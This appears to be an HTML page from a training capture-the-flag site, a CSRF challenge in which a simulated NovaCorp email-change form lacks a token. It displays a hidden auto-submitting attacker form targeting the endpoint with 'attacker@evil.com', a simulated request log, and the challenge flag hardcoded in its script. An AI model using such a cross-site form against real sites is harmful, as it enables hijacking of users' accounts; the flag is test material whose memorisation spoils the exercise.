@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Form — WebPWN CTF</title>
+    <link rel="stylesheet" href="../../styles/main.css" />
+    <link rel="stylesheet" href="../../styles/challenge.css" />
+</head>
+
+<body>
+    <nav class="nav">
+        <div class="nav-inner">
+            <a href="../../index.html" class="nav-logo">Web<span>PWN</span>.ctf</a>
+            <ul class="nav-links">
+                <li><a href="../index.html" class="active">Intermediate</a></li>
+                <li><a href="../../advanced/index.html">Advanced</a></li>
+                <li><a href="../../scoreboard/index.html">Scoreboard</a></li>
+                <li><span class="nav-badge" id="nav-solved-count">0/24</span></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container-sm">
+        <div class="breadcrumb">
+            <a href="../../index.html">Home</a><span class="breadcrumb-sep">/</span>
+            <a href="../index.html">Intermediate</a><span class="breadcrumb-sep">/</span>
+            <span class="breadcrumb-current">CSRF Form</span>
+        </div>
+
+        <div class="challenge-header">
+            <div class="challenge-header-meta">
+                <span class="badge badge-intermediate">🟡 Intermediate</span>
+                <span class="badge badge-purple">150 pts</span>
+                <span class="badge badge-info">CSRF</span>
+            </div>
+            <h1 class="challenge-title">🔁 CSRF <span>Form</span></h1>
+            <p class="challenge-subtitle">I-05 &nbsp;·&nbsp; /intermediate/csrf-form</p>
+        </div>
+
+        <div class="scenario-panel">
+            <div class="scenario-panel-label">// Scenario</div>
+            <p class="scenario-text">
+                NovaCorp's account settings page lets authenticated users change their email address.
+                The form doesn't include a CSRF token — so any website can silently trigger this action
+                on behalf of a logged-in user. You are the attacker: craft a hidden form on an "evil" page
+                that submits to NovaCorp's endpoint. When the simulated admin visits your evil page, the action fires.
+            </p>
+        </div>
+
+        <!-- Step tabs -->
+        <div class="tabs mt-24">
+            <button class="tab-btn active" onclick="switchTab('victim')">🏢 NovaCorp App</button>
+            <button class="tab-btn" onclick="switchTab('attacker')">😈 Attacker Page</button>
+            <button class="tab-btn" onclick="switchTab('result')">📋 Attack Result</button>
+        </div>
+
+        <!-- Victim app tab -->
+        <div class="tab-pane active" id="tab-victim">
+            <div class="vuln-area">
+                <div class="vuln-area-header"><span class="vuln-area-title">🏢 NovaCorp — Account Settings</span></div>
+                <div class="vuln-area-body">
+                    <div style="font-size:0.82rem;color:var(--text-muted);margin-bottom:16px;">
+                        Logged in as: <strong style="color:var(--green);">admin@novacorp.com</strong>
+                    </div>
+                    <div class="form-group mb-16">
+                        <label class="form-label">New Email Address</label>
+                        <input type="email" class="form-input" id="legit-email" value="admin@novacorp.com" />
+                    </div>
+                    <button class="btn btn-primary btn-sm" onclick="saveEmail()">Save Changes</button>
+                    <div style="margin-top:12px;font-size:0.78rem;color:var(--text-muted);">
+                        ⚠️ No CSRF token in this form. Any site can submit to this endpoint.
+                    </div>
+                    <div id="save-result" style="margin-top:12px;"></div>
+                </div>
+            </div>
+            <div class="code-block mt-16">
+                <div class="code-block-header">Change-email endpoint (no CSRF protection):</div>
+                <div class="code-block-body">
+                    POST /account/change-email<br>
+                    Content-Type: application/x-www-form-urlencoded<br>
+                    <br>
+                    email=<span class="str">newemail@attacker.com</span><br>
+                    <span class="cmt">// No csrf_token field! Any origin can submit this.</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Attacker page tab -->
+        <div class="tab-pane" id="tab-attacker">
+            <div class="vuln-area">
+                <div class="vuln-area-header"><span class="vuln-area-title">😈 evil-site.com/free-prizes.html</span>
+                </div>
+                <div class="vuln-area-body">
+                    <div class="alert alert-warning mb-16">This simulates what an "evil" page looks like to the victim's
+                        browser.</div>
+                    <div
+                        style="background:rgba(255,255,255,0.04);padding:20px;border-radius:var(--r-md);text-align:center;margin-bottom:20px;">
+                        <div style="font-size:2rem;margin-bottom:8px;">🎁</div>
+                        <h2 style="font-size:1.1rem;margin-bottom:8px;">You won a free iPhone!</h2>
+                        <p style="font-size:0.8rem;color:var(--text-muted);">Click Claim to get your prize</p>
+                        <button class="btn btn-primary mt-16" onclick="triggerCSRF()">Claim Prize 🎁</button>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-block-header">Hidden form on attacker page (view-source):</div>
+                        <div class="code-block-body">
+                            <span class="cmt">&lt;!-- Hidden auto-submit form --&gt;</span><br>
+                            &lt;<span class="kw">form</span> id=<span class="str">"csrf"</span> method=<span
+                                class="str">"POST"</span> action=<span
+                                class="str">"https://novacorp.com/account/change-email"</span>&gt;<br>
+                            &nbsp;&nbsp;&lt;<span class="kw">input</span> type=<span class="str">"hidden"</span>
+                            name=<span class="str">"email"</span> value=<span
+                                class="str">"attacker@evil.com"</span>&gt;<br>
+                            &lt;/<span class="kw">form</span>&gt;<br>
+                            &lt;<span class="kw">script</span>&gt;document.getElementById(<span
+                                class="str">'csrf'</span>).submit();&lt;/<span class="kw">script</span>&gt;
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Result tab -->
+        <div class="tab-pane" id="tab-result">
+            <div id="csrf-result-content">
+                <p style="color:var(--text-muted);">Trigger the CSRF attack first from the Attacker Page tab.</p>
+            </div>
+        </div>
+
+        <div class="hint-box">
+            <strong>💡 Hint</strong>
+            Go to <strong>Attacker Page</strong> tab and click "Claim Prize". This simulates the victim (admin)
+            loading the attacker's page, which auto-submits a cross-site form.
+        </div>
+
+        <div id="submission-area"></div>
+    </div>
+
+    <div style="height:80px;"></div>
+    <footer>
+        <div class="container-sm">
+            <span class="footer-logo">WebPWN.ctf</span> &nbsp;·&nbsp;
+            <a href="../index.html">← Intermediate</a> &nbsp;·&nbsp;
+            <a href="../jwt-weak/index.html">Next →</a>
+        </div>
+    </footer>
+
+    <script src="../../js/app.js"></script>
+    <script>
+        CTF.initSubmission('i05', 'FLAG{csrf_no_token}');
+
+        function switchTab(name) {
+            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('tab-' + name).classList.add('active');
+            document.querySelector(`[onclick="switchTab('${name}')"]`).classList.add('active');
+        }
+
+        function saveEmail() {
+            const email = document.getElementById('legit-email').value;
+            document.getElementById('save-result').innerHTML = `<div class="alert alert-success">Email updated to: ${email}</div>`;
+        }
+
+        function triggerCSRF() {
+            // Simulate the CSRF attack firing
+            const resultEl = document.getElementById('csrf-result-content');
+            resultEl.innerHTML = `
+    <div class="alert alert-danger mb-16">🚨 CSRF Attack Executed!</div>
+    <div class="terminal mb-16">
+      <div class="terminal-header"><span class="t-dot r"></span><span class="t-dot y"></span><span class="t-dot g"></span>
+        <span class="terminal-label">Request Log — novacorp.com</span></div>
+      <div class="terminal-body">
+        <div class="t-line t-cmd">POST /account/change-email HTTP/1.1</div>
+        <div class="t-line">Host: novacorp.com</div>
+        <div class="t-line">Origin: https://evil-site.com</div>
+        <div class="t-line">Cookie: session=admin_session_abc123</div>
+        <div class="t-line">Referer: https://evil-site.com/free-prizes.html</div>
+        <div class="t-line">&nbsp;</div>
+        <div class="t-line t-cmd">email=attacker@evil.com</div>
+        <div class="t-line">&nbsp;</div>
+        <div class="t-line" style="color:var(--purple);">← HTTP 200 OK (no CSRF token check)</div>
+        <div class="t-line" style="color:var(--purple);">← Admin email changed to attacker@evil.com</div>
+      </div>
+    </div>
+    <div class="flag-section">
+      <div class="flag-section-header">🚩 CSRF Confirmed — Flag</div>
+      <div class="flag-section-body">
+        <p style="color:var(--text-muted);font-size:0.85rem;">Cross-site form submission succeeded because there was no CSRF token to validate.</p>
+        <div class="flag-reveal">🚩 FLAG{csrf_no_token}</div>
+      </div>
+    </div>`;
+
+            switchTab('result');
+
+            // Discovery hint
+            if (!CTF.isSolved('i05')) {
+                const area = document.getElementById('submission-area');
+                if (!document.querySelector('.discovery-alert')) {
+                    const hintDiv = document.createElement('div');
+                    hintDiv.className = 'animate-in discovery-alert';
+                    hintDiv.style.marginTop = '20px';
+                    hintDiv.innerHTML = '<div class="scenario-panel" style="border-left-color:var(--magenta);">> CSRF EXTREME VULNERABILITY DETECTED. Copy the flag from the results and submit.</div>';
+                    area.insertAdjacentElement('beforebegin', hintDiv);
+                }
+            }
+        }
+    </script>
+</body>
+
+</html>
